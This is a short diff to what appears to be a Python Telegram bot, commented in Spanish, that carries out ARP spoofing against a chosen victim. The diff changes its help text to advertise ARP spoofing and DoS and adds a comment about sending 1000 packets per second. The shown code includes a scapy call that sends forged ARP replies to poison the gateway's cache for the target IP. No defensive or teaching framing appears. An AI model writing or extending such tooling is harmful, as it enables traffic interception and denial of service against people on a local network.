@@ -25,7 +25,7 @@ def start(update, context):
 
 def help(update, context):
 
-    update.message.reply_text('Use /attack para realizar ARP Spoofing')
+    update.message.reply_text('Use /attack para realizar ARP Spoofing y DoS')
 
 def target_ip(update, context):
 
@@ -61,7 +61,8 @@ def arp_spoofing(update, context):
 
         # Envía una solicitud ARP indicando que la dirección MAC de la víctima es la del gateway
         send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac))
-
+        
+        # Envía 1000 paquetes por segundo
         time.sleep(0.001)
 
     return ConversationHandler.END
